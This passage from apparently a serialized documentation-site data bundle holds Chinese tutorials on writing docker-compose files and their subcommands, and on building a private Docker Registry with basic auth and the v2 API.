### 服务名称 唯一\n  monitor-web-server-service:\n    ### 构建镜像的项目路径\n    build:\n      ### 指定上下文路径，默认是微服务项目的根目录\n      context: ./monitor-web/monitor-web-server/\n      ### 指定\n      dockerfile: monitor-web-server-service\n    ### 指定镜像名称\n    image: monitor-web-server-service\n    ### .env的环境变量\n    env_file:\n      - ./.env\n    ### 网络配置\n    networks:\n      - internal_access\n      - external_access ### db access\n\n  monitor-web-socket-service:\n    build: ./monitor-web/monitor-web-socket/monitor-web-socket-service\n    image: boboweike/monitor-web-socket-service\n    env_file:\n      - ./.env\n    ### 依赖的项目，启动的时候根据依赖关系定义启动顺序\n    depends_on:\n      - monitor-web-server-service\n    networks:\n      - internal_access\n      - external_access ### db access\n\n  monitor-gateway:\n    build: ./monitor-gateway\n    image: boboweike/monitor-gateway\n    ### 设置内部和外部端口\n    ports:\n    - 80:80\n    env_file:\n      - ./.env\n    ### 依赖的项目，启动的时候根据依赖关系定义启动顺序\n    depends_on:\n      - monitor-web-server-service\n      - monitor-web-server-service\n    networks:\n      - internal_access\n      - external_access\n    ### 心跳检查\n    healthcheck:\n      ### 访问 monitor-gateway 网关的命令\n      test: [ "CMD","curl","-f","http://localhost:80" ]\n      ### 间隔时间\n      interval: 1m30s\n      ### 超时时间\n      timeout: 10s\n      ### 重试次数\n      retries: 3\n\n  mysql:\n    image: mysql:5.7.32\n    container_name: mysql\n    ports:\n      - "3306:3306"\n    volumes:\n      - mysqldata:/var/lib/mysql\n      - mysqlconf:/etc/mysql\n    env_file:\n      - ./mysql.env\n    networks:\n      - external_access\n    ### 修改内核参数，也可以是数组的方式\n    sysctls:\n      net.core.somaxconn: 1024\n      net.ipv4.tcp_syncookies: 0\n    ### 指定容器的 ulimits 限制值，例如 ，\n    ulimits:\n      ### 指定最大进程数为 65535\n      nproc: 65535\n      ### 指定文件句柄数为\n      nofile:\n        ### 软限制 200000（软限制，应用可以随时修改，不能超过硬限制）\n        soft: 20000\n        ### 硬限制（系统硬限制，只能root用户提高）\n        hard: 40000\n\n\n  myaccount-service:\n    build:\n      context: ./frontend\n      dockerfile: myaccount/Dockerfile\n    image: boboweike/myaccount-spa\n    networks:\n      - internal_access\n\n\nnetworks:\n  internal_access:\n    internal: true\n  external_access:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n\n\n\n# Compose 指令\n\n对于 Compose 来说，大部分命令的对象既可以是项目本身，也可以指定为项目中的服务或者容器。如果没有特别的说明，命令对象将是项目，这意味着项目中所有的服务都会受到影响。\n\ndocker-compose [-f=<arg>...] [options] [COMMAND] [ARGS...]\n\n\n1\n\n\n\n# 命令选项\n\n * -f -> --file FILE 指定使用的 Compose 模板把文件，默认为 docker-compose.yml，可以多次指定。\n * -p -> --project-name NAME 指定项目名称，默认将使用所在目录名称作为项目名\n * --x-networking 使用 Docker 可插拔网络后端特性\n * --verbose 输出更多调试信息。\n * -v -> --version 打印版本并退出。\n\n\n# 命令使用说明\n\n# up\n\ndocker-compose up [options] [SERVICE...]\n\n\n1\n\n * 该命令十分强大，它将尝试自动完成包括构建镜像，（重新）创建服务，启动服务，并关联服务相关容器的一系列操作。\n * 连接的服务都将会被自动启动，除非已经处于运行状态\n * 大部分的时候都可以直接通过该命令来启动一个项目。\n * 默认情况，docker-compose up 启动的容器都在前台，控制台将会同时打印所有容器的输出信息，可以很方便进行调试。\n * 当通过 Ctrl-c 停止命令时，所有容器将会停止\n * 如果使用 docker-compose up -d，将会再后台启动并运行所有的容器，一般推荐生产环境下使用该选项。\n * 默认情况，如果服务容器已经存在，docker-compose up 将会尝试停止容器，然后重新创建（保持使用 volumes-from 挂载的卷），以保证新启动的服务匹配 docker-compose.yml 文件的最新内容。\n\n# down\n\ndocker-compose down\n\n\n1\n\n\n此命令将会停止 up 命令所启动的容器，并移除网络\n\n# exec\n\ndocker-compose exec 服务名\n\n\n1\n\n\n进入指定的容器\n\n# ps\n\ndocker-compose ps [options] [SERVICE...]\n\n\n1\n\n\n列出项目中目前的所有容器。\n\n * -q ，可以以打印容器的 ID 信息\n\n# restart\n\ndocker-compose restart [options] [service...]\n\n\n1\n\n\n重启项目中的服务，选项 -t 指定重启前停止容的超时时间（默认 10s）\n\n# rm\n\ndocker-compose rm [options] [service...]\n\n\n1\n\n\n删除所有（停止状态的）服务容器。推荐先执行 docker-compose stop 命令来停止容器。\n\n * -f 强制直接删除，包括非停止状态的容器。一般尽量不要使用该选项。\n * -v 删除容器所挂载的数据卷。\n\n# start\n\ndocker-compose start [service...]\n\n\n1\n\n\n启动已经存在的服务容器\n\n# stop\n\ndocker-compose stop [options] [service...]\n\n\n1\n\n\n停止已经处于运行状态的容器，但不删除它。通过 docker-compose start 可以再次启动这些容器\n\n * -t 停止容器的超时时间（默认为 10s）\n\n# top\n\ndocker-compose top\n\n\n1\n\n\n查看各个服务容器内运行的进程。\n\n# pause,unpause\n\ndocker-compose pause [service...]\n\n\n1\n\n\n暂停处于运行中的服务。\n\ndocker-compose unpause [service...]\n\n\n1\n\n\n恢复处于暂停状态中的服务。\n\n# logs\n\ndocker-compose logs [service...]\n\n\n1\n\n\n查看某个服务的日志',normalizedContent:'# 简介\n\ncompose 项目是 docker 官方的开源项目，负责实现对 docker 容器集群的快速编排，帮助定义和运行多个 docker 容器的应用，其前身是开源项目 fig。所谓编排就是能把一个项目的依赖（如 mysql，redis，服务间的依赖等）按照有序的方式启动容器\n\ndockerfile 可以让用户很方便的定义一个单独的应用容器，然而在日常工作中们经常会碰到需要多个容器相互配合来完成某项任务的情况。例如要实现一个 web 项目，除了 web 服务容器本身，往往还需要再加上后端的数据库服务器容器，甚至还包括负载均衡容器等。\n\ncompose 恰好满足了这样的需求，它允许通过一个单独的 docker-compose.yml 模板文件，来定义一组相关联的应用容器为一个项目。\n\ncompose 中有两个重要的概念\n\n 1. 服务（service），一个应用的容器，实际上可以包括若干运行相同镜像的容器实例。\n 2. 项目（project），由一组关联的应用容器组成的一个完整业务单元，再 docker-compose.yml 文件中定义。\n\ncompose 的默认管理对象是项目，通过子命令对项目中的一组容器进行便捷地生命周期管理。\n\ncompose 项目由 python 编写，实现上调用了 docker 服务提供的 api 来对容器进行管理。因此，只要所操作的平台支持 docker api，就可以再其上利用 compose 来进行编排管理。\n\n\n# 安装与卸载\n\n安装的话，可以安装 docker desktop ，它包含了 docker 以及 compose 和 k8s，也可以单独安装，但建议先了解清楚官方对 compose 的一些安装限制。官方地址\n\nlinux 安装\n\nsudo curl -l "https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose\nsudo chmod +x /usr/local/bin/docker-compose\ndocker-compose --version\n\n\n1\n2\n3\n\n\n\n# 命令\n\n命令            描述\nversion       版本目前 4 以下的都可以写，如 3.9，3.8 等，最好保持和 docker 版本兼容\nservices      可以里面描述你的所有服务，以及依赖关系等\nimage         指定为镜像名称或镜像 id，如果镜像在本地不存在，compose 将会尝试拉取这个镜像\nports         指定与宿主机与容器映射的端口，是一个数组，每个数组的元素建议用字符形式，如 "80:80"\nvolumes       挂载路径设置，类型为数组，可以挂载多个，在制作容器的时候可以显示的声明挂载路径，也可以在容器运行时直接使用 -v 命令。\nnetworks      配置容器连接的网络 docker network ls 查看网络列表， docker network inspect\n              <container id> 可以查看对应网络的配置\nenvironment   设置环境变量。你可以使用数组或字典两种方式\nenv_file      从文件中获取环境变量，可以为单独的文件路径或列表，文件内必须是字典方式编写\ncommand       覆盖容器启动后默认执行的命令\ndepends_on    解决容器的依赖、启动先后的问题，填写的值为 服务名，会等依赖的服务启动一定程度才启动自己\nhealthcheck   通过命令检查容器是否监控运行\nsysctls       配置容器内核参数，如 es 等都需要修改内核的环境参数\nulimits       指定容器的 ulimits 限制值，如 es、clickhouse 会有修改需求\nbuild         用来将指定 dockerfile 打包成对应镜像，然后再运行该镜像\n\n这些命令其实就类似于我们在 docker 中启动一个容器的命令。\n\n\n# compose 文件编写\n\n\n# 示例 1\n\n### 版本\nversion: "3.2"\n\nservices:\n  ### 服务名称\n  tomcat:\n    ### 指定容器的名称 相当于 --name\n    container_name: tomcat_1\n    ### 使用哪个镜像 相当于 docket run image\n    image: tomcat:8.0-jre8\n    ### 指定宿主机与容器端口的映射 相当于 -p\n    ports:\n      ### 宿主机:容器\n      - "8080:8080"\n    ### 宿主机与容器的数据共享 挂载目录 相当于 -v\n    volumes:\n      ### 方式1：指定绝对明确(绝对路径)的挂载目录\n      - /home/server:/user\n      ### 方式2：声明了自定创建卷名的变量\n      - tomcatwebapps:/user\n    ### 代表当前服务处于那个网络，作用是网络隔离用，会把相网络名称相同的容器的网段统一。相当于 --network\n    networks:\n      - group1\n\n  mysql:\n    image: mysql:5.7.32\n    container_name: mysql\n    ports:\n    - "3306:3306"\n    volumes:\n    - mysqldata:/var/lib/mysql\n    - mysqlconf:/etc/mysql\n    environment:\n      -mysql_root_password=root\n    networks:\n      group1\n\n\n### 描述 挂在卷里的变量\nvolumes:\n  ### 指定变量 tomcatwebapps，如果不写 external，默认会是 docker-compose.yml 所在当前文件夹的名称(会自动创建)\n  tomcatwebapps:\n    ### 使用自定义卷毛\n    external:\n      ### true 确定使用指定卷名，注意：一旦使用外部自定义卷名，启动服务之前必须手动创建 docker volume create 卷名\n      false\n  mysqldata:\n  mysqlconf:\n\n### 定义服务用到的网络\nnetworks:\n  ### 定义上面的服务用到的网络的名称，默认是驱动属于 bridge，自定义的网络名称 group1，在实际中会变为 项目名(或所在文件目录名)\n  group1:\n    ### 使用外部指定的网络，为 true 就标识网络必须存在\n    external:\n      ### docker network create -d bridge 网络名称\n      true\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\n\n# 示例 2\n\n### 指定版本，版本的关系和docker 引擎有关\n### https://docs.docker.com/compose/compose-file/compose-file-v3/#profiles 版本关系及说明\nversion: \'3.7\'\n\n### 指定服务\nservices:\n  ### 服务名称 唯一\n  monitor-web-server-service:\n    ### 构建镜像的项目路径\n    build:\n      ### 指定上下文路径，默认是微服务项目的根目录\n      context: ./monitor-web/monitor-web-server/\n      ### 指定\n      dockerfile: monitor-web-server-service\n    ### 指定镜像名称\n    image: monitor-web-server-service\n    ### .env的环境变量\n    env_file:\n      - ./.env\n    ### 网络配置\n    networks:\n      - internal_access\n      - external_access ### db access\n\n  monitor-web-socket-service:\n    build: ./monitor-web/monitor-web-socket/monitor-web-socket-service\n    image: boboweike/monitor-web-socket-service\n    env_file:\n      - ./.env\n    ### 依赖的项目，启动的时候根据依赖关系定义启动顺序\n    depends_on:\n      - monitor-web-server-service\n    networks:\n      - internal_access\n      - external_access ### db access\n\n  monitor-gateway:\n    build: ./monitor-gateway\n    image: boboweike/monitor-gateway\n    ### 设置内部和外部端口\n    ports:\n    - 80:80\n    env_file:\n      - ./.env\n    ### 依赖的项目，启动的时候根据依赖关系定义启动顺序\n    depends_on:\n      - monitor-web-server-service\n      - monitor-web-server-service\n    networks:\n      - internal_access\n      - external_access\n    ### 心跳检查\n    healthcheck:\n      ### 访问 monitor-gateway 网关的命令\n      test: [ "cmd","curl","-f","http://localhost:80" ]\n      ### 间隔时间\n      interval: 1m30s\n      ### 超时时间\n      timeout: 10s\n      ### 重试次数\n      retries: 3\n\n  mysql:\n    image: mysql:5.7.32\n    container_name: mysql\n    ports:\n      - "3306:3306"\n    volumes:\n      - mysqldata:/var/lib/mysql\n      - mysqlconf:/etc/mysql\n    env_file:\n      - ./mysql.env\n    networks:\n      - external_access\n    ### 修改内核参数，也可以是数组的方式\n    sysctls:\n      net.core.somaxconn: 1024\n      net.ipv4.tcp_syncookies: 0\n    ### 指定容器的 ulimits 限制值，例如 ，\n    ulimits:\n      ### 指定最大进程数为 65535\n      nproc: 65535\n      ### 指定文件句柄数为\n      nofile:\n        ### 软限制 200000（软限制，应用可以随时修改，不能超过硬限制）\n        soft: 20000\n        ### 硬限制（系统硬限制，只能root用户提高）\n        hard: 40000\n\n\n  myaccount-service:\n    build:\n      context: ./frontend\n      dockerfile: myaccount/dockerfile\n    image: boboweike/myaccount-spa\n    networks:\n      - internal_access\n\n\nnetworks:\n  internal_access:\n    internal: true\n  external_access:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n\n\n\n# compose 指令\n\n对于 compose 来说，大部分命令的对象既可以是项目本身，也可以指定为项目中的服务或者容器。如果没有特别的说明，命令对象将是项目，这意味着项目中所有的服务都会受到影响。\n\ndocker-compose [-f=<arg>...] [options] [command] [args...]\n\n\n1\n\n\n\n# 命令选项\n\n * -f -> --file file 指定使用的 compose 模板把文件，默认为 docker-compose.yml，可以多次指定。\n * -p -> --project-name name 指定项目名称，默认将使用所在目录名称作为项目名\n * --x-networking 使用 docker 可插拔网络后端特性\n * --verbose 输出更多调试信息。\n * -v -> --version 打印版本并退出。\n\n\n# 命令使用说明\n\n# up\n\ndocker-compose up [options] [service...]\n\n\n1\n\n * 该命令十分强大，它将尝试自动完成包括构建镜像，（重新）创建服务，启动服务，并关联服务相关容器的一系列操作。\n * 连接的服务都将会被自动启动，除非已经处于运行状态\n * 大部分的时候都可以直接通过该命令来启动一个项目。\n * 默认情况，docker-compose up 启动的容器都在前台，控制台将会同时打印所有容器的输出信息，可以很方便进行调试。\n * 当通过 ctrl-c 停止命令时，所有容器将会停止\n * 如果使用 docker-compose up -d，将会再后台启动并运行所有的容器，一般推荐生产环境下使用该选项。\n * 默认情况，如果服务容器已经存在，docker-compose up 将会尝试停止容器，然后重新创建（保持使用 volumes-from 挂载的卷），以保证新启动的服务匹配 docker-compose.yml 文件的最新内容。\n\n# down\n\ndocker-compose down\n\n\n1\n\n\n此命令将会停止 up 命令所启动的容器，并移除网络\n\n# exec\n\ndocker-compose exec 服务名\n\n\n1\n\n\n进入指定的容器\n\n# ps\n\ndocker-compose ps [options] [service...]\n\n\n1\n\n\n列出项目中目前的所有容器。\n\n * -q ，可以以打印容器的 id 信息\n\n# restart\n\ndocker-compose restart [options] [service...]\n\n\n1\n\n\n重启项目中的服务，选项 -t 指定重启前停止容的超时时间（默认 10s）\n\n# rm\n\ndocker-compose rm [options] [service...]\n\n\n1\n\n\n删除所有（停止状态的）服务容器。推荐先执行 docker-compose stop 命令来停止容器。\n\n * -f 强制直接删除，包括非停止状态的容器。一般尽量不要使用该选项。\n * -v 删除容器所挂载的数据卷。\n\n# start\n\ndocker-compose start [service...]\n\n\n1\n\n\n启动已经存在的服务容器\n\n# stop\n\ndocker-compose stop [options] [service...]\n\n\n1\n\n\n停止已经处于运行状态的容器，但不删除它。通过 docker-compose start 可以再次启动这些容器\n\n * -t 停止容器的超时时间（默认为 10s）\n\n# top\n\ndocker-compose top\n\n\n1\n\n\n查看各个服务容器内运行的进程。\n\n# pause,unpause\n\ndocker-compose pause [service...]\n\n\n1\n\n\n暂停处于运行中的服务。\n\ndocker-compose unpause [service...]\n\n\n1\n\n\n恢复处于暂停状态中的服务。\n\n# logs\n\ndocker-compose logs [service...]\n\n\n1\n\n\n查看某个服务的日志',charsets:{cjk:!0}},{title:"Docker私有库的开发",frontmatter:{title:"Docker私有库的开发",date:"2023-06-25T09:22:36.000Z",permalink:"/docker/402",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/40.Docker/402.Docker%E7%A7%81%E6%9C%89%E5%BA%93%E7%9A%84%E5%BC%80%E5%8F%91.html",relativePath:"04.运维/40.Docker/402.Docker私有库的开发.md",key:"v-d0de8634",path:"/docker/402/",headers:[{level:2,title:"准备",slug:"准备",normalizedTitle:"准备",charIndex:721},{level:3,title:"config.yml",slug:"config-yml",normalizedTitle:"config.yml",charIndex:1001},{level:2,title:"使用 Docker Registry",slug:"使用-docker-registry",normalizedTitle:"使用 docker registry",charIndex:6398},{level:2,title:"访问 Registry API",slug:"访问-registry-api",normalizedTitle:"访问 registry api",charIndex:6773}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"准备 config.yml 使用 Docker Registry 访问 Registry API",content:'正常来说我们使用别人的私有库就足够了，比如使用 Harbor，它可以帮我们很好的管理 docker，以及部署为私有或公有库给企业或其他人使用，如果想开发一套那么需要了解 docker 相关的 API，其中 dockerAPI 分为如下三部分：\n\n * Docker Engine API：Docker Engine API 是 Docker 引擎的 API 接口，用于与 Docker 引擎进行通信和管理。通过 Docker Engine API，可以管理容器、镜像、网络、卷等 Docker 相关资源。可以使用 Docker Engine API 创建、启动、停止和删除容器，构建和推送镜像，以及进行容器和镜像的管理和监控。\n * Docker Hub API：Docker Hub API 是与 Docker Hub 交互的 API 接口。Docker Hub 是一个公共的 Docker 镜像仓库，用于存储和分享 Docker 镜像。Docker Hub API 允许用户通过 API 接口与 Docker Hub 进行交互，可以搜索、下载、上传和删除镜像，管理仓库、标签和组织等\n * Registry API：Registry API 是与 Docker Registry 进行交互的 API 接口。Docker Registry 是一个私有的 Docker 镜像仓库，可以自己搭建和管理。Registry API 允许用户通过 API 接口与私有的 Docker Registry 进行交互，可以上传、下载和删除镜像，管理仓库和标签等\n\n没错，如果需要建立自己的 docker 私有库就要用到 Registry API。\n\n\n# 准备\n\n要在本地搭建私有的 Docker Registry，您可以按照以下步骤进行操作：\n\n 1. 确保已经安装 Docker，若还没有，您可以从 Docker 官方网站（https://www.docker.com/）下载并安装适用于您的操作系统的 Docker 版本。\n 2. 配置 Docker Registry：接下来，您需要创建并配置 Docker Registry。可以按照以下步骤进行配置：\n    * 创建一个存储 Registry 数据的目录。例如，您可以创建一个名为 /var/lib/registry 的目录。\n    * 创建一个名为 config.yml 的配置文件，并在其中指定 Registry 的配置选项。例如，您可以指定 Registry 监听在 5000 端口上，并允许匿名访问。（具体见下面 config 配置讲解）\n 3. 为 Docker Registry API 提前配置\n    先进行配置，去 /etc/docker/daemon.json 添加如下一句，最好是宿主机的 IP， 不要使用 127.0.0.1 ，我这里是方便测试，不使用宿主机 IP，会造成在使用 Docker Engine API 报 HTTPS 错误。\n\n{\n  "insecure-registries": ["127.0.0.1:5000"]\n}\n\n\n1\n2\n3\n\n\n配置完成后需要重新启动 Docker\n\nsudo systemctl restart docker\n\n\n1\n\n 4. 启动 Registry 容器：使用以下命令在本地启动 Registry 容器，官方文档 https://docs.docker.com/registry/deploying/?_gl=11ytdheb_gaODY2NTEyNi4xNjkyMDAxODU2_ga_XJWPQMJYHQ*MTY5Mzk5NzEyNy4yNS4xLjE2OTM5OTcyMTAuNTMuMC4w#native-basic-auth\n\ndocker run -d -p 5000:5000 --restart=always --name registry -v /opt/software/dockerRegistry:/var/lib/registry -v /opt/software/dockerRegistry/config.yml:/etc/docker/registry/config.yml registry:2\n\n\n1\n\n\n这个命令将在本地启动一个名为 registry 的容器，并将本地的 /var/lib/registry 目录挂载到容器的 /var/lib/registry 目录，以保存 Registry 的数据。\n5. 测试 Registry：现在，您的私有 Docker Registry 应该已经在本地成功搭建。您可以使用以下命令来测试 Registry 是否正常工作：\n\n * 从 Docker Hub 拉取一个镜像：\n\ndocker pull ubuntu\n\n\n1\n\n * 标记该镜像为私有 Registry 的地址：\n\ndocker tag ubuntu 127.0.0.1:5000/my-ubuntu\n\n\n1\n\n * 将标记的镜像推送到私有 Registry：\n\ndocker push 127.0.0.1:5000/my-ubuntu\n\n\n1\n\n * 从私有 Registry 拉取镜像：\n\ndocker pull 127.0.0.1:5000/my-ubuntu\n\n\n1\n\n\n如果上述步骤都成功执行，那么私有 Docker Registry 就已经搭建好了，并且可以通过 http://127.0.0.1:5000/v2/my-ubuntu/tags/list 进行访问。\n\n\n# config.yml\n\nconfig 里面是一些配置信息，包括存储库位置，日志，安全认证等，首先要配置安全认证\n\n# 安装 htpasswd 文件的工具\nyum install -y httpd-tools\n# 创建一个 htpasswd 文件，并添加用户名和密码\nhtpasswd -Bbn user1 password1 > /opt/software/dockerRegistry/htpasswd\n\n\n1\n2\n3\n4\n\n\n配置 config.xml\n\n# 指定配置文件的版本。目前可用的版本为0.1。\nversion: 0.1                                                                                                                                                                           \nlog:                                                                                                                                                                                   \n  fields:                                                                                                                                                                              \n    service: registry                                                                                                                                                                  \nstorage:                                                                                                                                                                               \n  cache:                                                                                                                                                                               \n    blobdescriptor: inmemory                                                                                                                                                           \n  filesystem:         \n    # 指定存储镜像数据的目录路径。                                                                                                                                                                 \n    rootdirectory: /var/lib/registry\n  # 可执行删除操作，不能省                                                                                                                                                   \n  delete:                                                                                                                                                                              \n    enabled: true\n# 暴漏端口                                                                                                                                                                      \nhttp:                                                                                                                                                                                  \n  addr: :5000                                                                                                                                                                          \n  headers:                                                                                                                                                                             \n    X-Content-Type-Options: [nosniff]    \n# 心跳                                                                                                                                              \nhealth:                                                                                                                                                                                \n  storagedriver:                                                                                                                                                                       \n    enabled: true                                                                                                                                                                      \n    interval: 10s                                                                                                                                                                      \n    threshold: 3     \n# 基本认证(Basic Auth)，还可以使用Bearer Token认证、AWS认证、LDAP认证\nauth:\n  htpasswd: \n    realm: registry\n    path: /opt/software/dockerRegistry/htpasswd \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n如果已经启动容器，修改后需要重新启动容器\n\n\n# 使用 Docker Registry\n\n接下来先登录我们的私有库，如果是本机，使用 127.0.0.1，如果没设置账号密码，则默认是宿主机本身 SSH 连接的账号密码\n\ndocker login <registry_host>\n# 可以使用快捷命令\ndocker login 127.0.0.1:5000 --username=xxx --password=xxxx\n\n\n1\n2\n3\n\n\n登出\n\ndocker logout <registry_host>\n\n\n1\n\n\n为需要推送的镜像打 tag（必须）\n\ndocker tag my-image:latest 127.0.0.1:5000/my-image:latest\n\n\n1\n\n\n推送镜像\n\ndocker push localhost:5000/my-image:latest\n\n\n1\n\n\n\n# 访问 Registry API\n\nAPI 的访问输入你 docker 所在的 IP，加以上设置的端口就行，访问需要带版本号，目前 Docker 建议使用 v2 版本，所以请求路径需要带上，如： http://xx.xxx.xx.xx:5000/v2/_catalog\n\n * 检查连接（一定要考虑兼容）\n\nGET /v2/\n返回 200 代表ok\n返回 401 代表需要身份验证\n返回 404 代表注册表未实现 /v2/，有可能就是 v1\n\n\n1\n2\n3\n4\n\n * 列出存储库：\n\n// 获取全部\nGET /v2/_catalog\n{\n  "repositories": [\n    <name>,\n    ...\n  ]\n}\n// 分页获取\nGET /v2/_catalog?n=<integer>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n * 列出镜像 tags\n\n/v2/<ImagesName>/tags/list \n\n\n1\n',normalizedContent:'正常来说我们使用别人的私有库就足够了，比如使用 harbor，它可以帮我们很好的管理 docker，以及部署为私有或公有库给企业或其他人使用，如果想开发一套那么需要了解 docker 相关的 api，其中 dockerapi 分为如下三部分：\n\n * docker engine api：docker engine api 是 docker 引擎的 api 接口，用于与 docker 引擎进行通信和管理。通过 docker engine api，可以管理容器、镜像、网络、卷等 docker 相关资源。可以使用 docker engine api 创建、启动、停止和删除容器，构建和推送镜像，以及进行容器和镜像的管理和监控。\n * docker hub api：docker hub api 是与 docker hub 交互的 api 接口。docker hub 是一个公共的 docker 镜像仓库，用于存储和分享 docker 镜像。docker hub api 允许用户通过 api 接口与 docker hub 进行交互，可以搜索、下载、上传和删除镜像，管理仓库、标签和组织等\n * registry api：registry api 是与 docker registry 进行交互的 api 接口。docker registry 是一个私有的 docker 镜像仓库，可以自己搭建和管理。registry api 允许用户通过 api 接口与私有的 docker registry 进行交互，可以上传、下载和删除镜像，管理仓库和标签等\n\n没错，如果需要建立自己的 docker 私有库就要用到 registry api。\n\n\n# 准备\n\n要在本地搭建私有的 docker registry，您可以按照以下步骤进行操作：\n\n 1. 确保已经安装 docker，若还没有，您可以从 docker 官方网站（https://www.docker.com/）下载并安装适用于您的操作系统的 docker 版本。\n 2. 配置 docker registry：接下来，您需要创建并配置 docker registry。可以按照以下步骤进行配置：\n    * 创建一个存储 registry 数据的目录。例如，您可以创建一个名为 /var/lib/registry 的目录。\n    * 创建一个名为 config.yml 的配置文件，并在其中指定 registry 的配置选项。例如，您可以指定 registry 监听在 5000 端口上，并允许匿名访问。（具体见下面 config 配置讲解）\n 3. 为 docker registry api 提前配置\n    先进行配置，去 /etc/docker/daemon.json 添加如下一句，最好是宿主机的 ip， 不要使用 127.0.0.1 ，我这里是方便测试，不使用宿主机 ip，会造成在使用 docker engine api 报 https 错误。\n\n{\n  "insecure-registries": ["127.0.0.1:5000"]\n}\n\n\n1\n2\n3\n\n\n配置完成后需要重新启动 docker\n\nsudo systemctl restart docker\n\n\n1\n\n 4. 启动 registry 容器：使用以下命令在本地启动 registry 容器，官方文档 https://docs.docker.com/registry/deploying/?_gl=11ytdheb_gaody2nteyni4xnjkymdaxodu2_ga_xjwpqmjyhq*mty5mzk5nzeyny4yns4xlje2otm5otcymtauntmumc4w#native-basic-auth\n\ndocker run -d -p 5000:5000 --restart=always --name registry -v /opt/software/dockerregistry:/var/lib/registry -v /opt/software/dockerregistry/config.yml:/etc/docker/registry/config.yml registry:2\n\n\n1\n\n\n这个命令将在本地启动一个名为 registry 的容器，并将本地的 /var/lib/registry 目录挂载到容器的 /var/lib/registry 目录，以保存 registry 的数据。\n5. 测试 registry：现在，您的私有 docker registry 应该已经在本地成功搭建。您可以使用以下命令来测试 registry 是否正常工作：\n\n * 从 docker hub 拉取一个镜像：\n\ndocker pull ubuntu\n\n\n1\n\n * 标记该镜像为私有 registry 的地址：\n\ndocker tag ubuntu 127.0.0.1:5000/my-ubuntu\n\n\n1\n\n * 将标记的镜像推送到私有 registry：\n\ndocker push 127.0.0.1:5000/my-ubuntu\n\n\n1\n\n * 从私有 registry 拉取镜像：\n\ndocker pull 127.0.0.1:5000/my-ubuntu\n\n\n1\n\n\n如果上述步骤都成功执行，那么私有 docker registry 就已经搭建好了，并且可以通过 http://127.0.0.1:5000/v2/my-ubuntu/tags/list 进行访问。\n\n\n# config.yml\n\nconfig 里面是一些配置信息，包括存储库位置，日志，安全认证等，首先要配置安全认证\n\n# 安装 htpasswd 文件的工具\nyum install -y httpd-tools\n# 创建一个 htpasswd 文件，并添加用户名和密码\nhtpasswd -bbn user1 password1 > /opt/software/dockerregistry/htpasswd\n\n\n1\n2\n3\n4\n\n\n配置 config.xml\n\n# 指定配置文件的版本。目前可用的版本为0.1。\nversion: 0.1                                                                                                                                                                           \nlog:                                                                                                                                                                                   \n  fields:                                                                                                                                                                              \n    service: registry                                                                                                                                                                  \nstorage:                                                                                                                                                                               \n  cache:                                                                                                                                                                               \n    blobdescriptor: inmemory                                                                                                                                                           \n  filesystem:         \n    # 指定存储镜像数据的目录路径。                                                                                                                                                                 \n    rootdirectory: /var/lib/registry\n  # 可执行删除操作，不能省                                                                                                                                                   \n  delete:                                                                                                                                                                              \n    enabled: true\n# 暴漏端口                                                                                                                                                                      \nhttp:                                                                                                                                                                                  \n  addr: :5000                                                                                                                                                                          \n  headers:                                                                                                                                                                             \n    x-content-type-options: [nosniff]    \n# 心跳                                                                                                                                              \nhealth:                                                                                                                                                                                \n  storagedriver:                                                                                                                                                                       \n    enabled: true                                                                                                                                                                      \n    interval: 10s                                                                                                                                                                      \n    threshold: 3     \n# 基本认证(basic auth)，还可以使用bearer token认证、aws认证、ldap认证\nauth:\n  htpasswd: \n    realm: registry\n    path: /opt/software/dockerregistry/htpasswd \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n如果已经启动容器，修改后需要重新启动容器\n\n\n# 使用 docker registry\n\n接下来先登录我们的私有库，如果是本机，使用 127.0.0.1，如果没设置账号密码，则默认是宿主机本身 ssh 连接的账号密码\n\ndocker login <registry_host>\n# 可以使用快捷命令\ndocker login 127.0.0.1:5000 --username=xxx --password=xxxx\n\n\n1\n2\n3\n\n\n登出\n\ndocker logout <registry_host>\n\n\n1\n\n\n为需要推送的镜像打 tag（必须）\n\ndocker tag my-image:latest 127.0.0.1:5000/my-image:latest\n\n\n1\n\n\n推送镜像\n\ndocker push localhost:5000/my-image:latest\n\n\n1\n\n\n\n# 访问 registry api\n\napi 的访问输入你 docker 所在的 ip，加以上设置的端口就行，访问需要带版本号，目前 